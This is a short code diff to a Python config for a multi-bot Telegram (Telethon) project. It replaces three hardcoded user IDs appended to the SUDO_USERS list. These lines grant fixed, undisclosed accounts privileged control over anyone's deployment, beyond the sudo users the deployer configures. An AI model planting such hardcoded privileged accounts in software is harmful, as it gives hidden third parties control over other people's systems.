@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(6919199044)
-SUDO_USERS.append(6762113050)
-SUDO_USERS.append(6876910746)
+SUDO_USERS.append(8080916106)
+SUDO_USERS.append(6177197817)
+SUDO_USERS.append(7411390279)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
@@ -48,3 +48,4 @@ MK7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
 MK8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
 MK9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 MK10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+
